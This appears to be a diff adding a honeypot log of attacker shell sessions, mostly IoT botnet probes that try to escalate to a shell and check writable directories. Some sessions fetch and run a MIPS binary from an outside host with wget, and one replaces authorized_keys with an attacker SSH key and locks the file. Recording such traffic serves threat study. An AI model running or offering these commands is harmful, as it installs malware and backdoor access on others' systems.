@@ -1,0 +1,357 @@
+=== session f83d851628f3 | src_ip 64.62.156.XYZ | 2026-08-29T02:24:56.950718Z ===
+Accept-Encoding: gzip
+
+
+=== session f999adb36665 | src_ip 114.33.12.XYZ | 2026-08-29T04:26:27.860164Z ===
+sh
+shell
+enable
+system
+ping; sh
+
+/bin/busybox cat /proc/self/exe || cat /proc/self/exe
+
+=== session e5a1ed39a44b | src_ip 114.33.12.XYZ | 2026-08-29T04:26:31.093947Z ===
+sh
+shell
+enable
+system
+ping; sh
+
+mkdir /usr/;>/usr/.a && cd /usr/; rm -rf .a
+mkdir /mnt/;>/mnt/.a && cd /mnt/; rm -rf .a
+mkdir /var/run/;>/var/run/.a && cd /var/run/; rm -rf .a
+mkdir /dev/shm/;>/dev/shm/.a && cd /dev/shm/; rm -rf .a
+mkdir /etc/;>/etc/.a && cd /etc/; rm -rf .a
+mkdir /var/;>/var/.a && cd /var/; rm -rf .a
+mkdir /tmp/;>/tmp/.a && cd /tmp/; rm -rf .a
+mkdir /dev/;>/dev/.a && cd /dev/; rm -rf .a
+mkdir /var/home/user/fw/;>/var/home/user/fw/.a && cd /var/home/user/fw/; rm -rf .a
+
+=== session 860622e03b27 | src_ip 45.167.13.XYZ | 2026-08-29T05:15:16.945441Z ===
+uname -a
+hostname
+uname -m&&pkill upnpsetup
+rm ./upnpsetup
+wget -nc http://45.87.174.XYZ/k.php?a=mips,F4Y1MHNHN10C9X48H -O ./upnpsetup
+chmod 777 ./upnpsetup
+sudo ./upnpsetup
+./upnpsetup
+
+=== session e130e2c2f9a7 | src_ip 125.40.86.XYZ | 2026-08-29T05:32:38.479714Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x50\x46\x49\x57\x55\x4f'
+
+=== session 5b8cecc8d717 | src_ip 103.31.100.XYZ | 2026-08-29T05:58:59.558403Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4b\x59\x47\x56\x51\x55'
+
+=== session 2bccc88dcfa7 | src_ip 119.116.34.XYZ | 2026-08-29T06:33:52.693146Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x54\x44\x53\x4c\x52\x53'
+
+=== session 980a2d0b08ae | src_ip 110.38.7.XYZ | 2026-08-29T07:14:54.308751Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4c\x50\x43\x58\x4e\x55'
+
+=== session ca1801601599 | src_ip 130.12.180.XYZ | 2026-08-29T09:20:02.059759Z ===
+chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
+
+=== session 33094b52f6b2 | src_ip 110.173.190.XYZ | 2026-08-29T09:54:13.983094Z ===
+echo xsec
+
+=== session 69409b38e05c | src_ip 182.118.247.XYZ | 2026-08-29T11:51:13.835066Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x45\x45\x47\x44\x4a\x55'
+
+=== session 14a77100391c | src_ip 182.118.247.XYZ | 2026-08-29T11:51:45.740280Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x45\x45\x47\x44\x4a\x55'
+
+=== session a0f039aaa246 | src_ip 153.117.1.XYZ | 2026-08-29T12:19:07.950722Z ===
+start
+enable
+config terminal
+system
+su
+linuxshell
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4b\x56\x57\x45\x59\x51'
+
+=== session 40f76077d115 | src_ip 153.117.1.XYZ | 2026-08-29T12:19:22.833057Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+sh
+shell
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4b\x56\x57\x45\x59\x51'
+
+=== session 6e7d075b8a56 | src_ip 153.117.1.XYZ | 2026-08-29T12:20:08.994042Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4b\x56\x57\x45\x59\x51'
+
+=== session 71bed5cabecd | src_ip 153.117.33.XYZ | 2026-08-29T12:47:45.549677Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4e\x52\x4a\x43\x42\x41'
+
+=== session 5798be4d4ac2 | src_ip 110.38.7.XYZ | 2026-08-29T13:01:39.703677Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4a\x58\x42\x4b\x58\x44'
+
+=== session 67d421489a23 | src_ip 110.38.7.XYZ | 2026-08-29T13:01:55.323102Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4a\x58\x42\x4b\x58\x44'
+
+=== session ae05a0bfda66 | src_ip 110.38.7.XYZ | 2026-08-29T13:02:30.512123Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4a\x58\x42\x4b\x58\x44'
+
+=== session acf7d266c335 | src_ip 110.38.7.XYZ | 2026-08-29T13:03:11.390615Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4a\x58\x42\x4b\x58\x44'
+
+=== session afb5fbab4efb | src_ip 182.121.197.XYZ | 2026-08-29T13:53:53.668605Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x56\x4d\x50\x50\x55'
+
+=== session cb324a627270 | src_ip 182.121.197.XYZ | 2026-08-29T13:54:20.101473Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x56\x4d\x50\x50\x55'
+
+=== session aec2a7da0e71 | src_ip 182.121.197.XYZ | 2026-08-29T13:54:46.579107Z ===
+start
+enable
+config terminal
+system
+su
+linuxshell
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x56\x4d\x50\x50\x55'
+
+=== session 5deb165fff0a | src_ip 45.167.13.XYZ | 2026-08-29T16:42:19.122296Z ===
+uname -a
+hostname
+uname -m&&pkill upnpsetup
+rm ./upnpsetup
+wget -nc http://45.87.174.XYZ/k.php?a=mips,F4Y1MHNHN10C9X48H -O ./upnpsetup
+chmod 777 ./upnpsetup
+sudo ./upnpsetup
+./upnpsetup
+
+=== session 4b93df8a6d85 | src_ip 72.255.33.XYZ | 2026-08-29T17:47:32.416930Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x54\x45\x59\x59\x45\x45'
+
+=== session bb2835515aba | src_ip 72.255.33.XYZ | 2026-08-29T17:47:47.910099Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+sh
+shell
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x54\x45\x59\x59\x45\x45'
+
+=== session 6c2958ccd895 | src_ip 72.255.33.XYZ | 2026-08-29T17:48:21.790892Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x54\x45\x59\x59\x45\x45'
+
+=== session 5d45adf2bba3 | src_ip 223.123.124.XYZ | 2026-08-29T17:52:53.784965Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x4b\x5a\x45\x55\x4d\x50'
+
+=== session f7bed806f05d | src_ip 110.173.190.XYZ | 2026-08-29T18:28:20.389543Z ===
+echo xsec
+
+=== session a7cb48adc0af | src_ip 49.248.197.XYZ | 2026-08-29T18:30:54.953166Z ===
+echo xsec
+
+=== session 6e92abe1c086 | src_ip 202.165.25.XYZ | 2026-08-29T18:37:17.058617Z ===
+echo xsec
+
+=== session ef95aa523f16 | src_ip 116.74.164.XYZ | 2026-08-29T18:40:01.945171Z ===
+echo xsec
+
+=== session f83380b97ddd | src_ip 14.17.59.XYZ | 2026-08-29T20:51:37.180031Z ===
+uname -s -m
+
+=== session 094e001dcecc | src_ip 153.117.127.XYZ | 2026-08-29T21:48:41.409732Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x57\x49\x48\x41\x48\x4e'
+
+=== session 67c90caa52cb | src_ip 103.66.148.XYZ | 2026-08-29T22:00:37.283266Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x45\x55\x42\x42\x58'
+
+=== session 1d6caa8dfba1 | src_ip 103.66.148.XYZ | 2026-08-29T22:00:54.797224Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x45\x55\x42\x42\x58'
+
+=== session 293e184e7fbf | src_ip 203.101.186.XYZ | 2026-08-29T22:07:32.508107Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x51\x4e\x43\x46\x4a\x59'
+
+=== session 31026534bd02 | src_ip 203.101.186.XYZ | 2026-08-29T22:08:25.480003Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x51\x4e\x43\x46\x4a\x59'
+
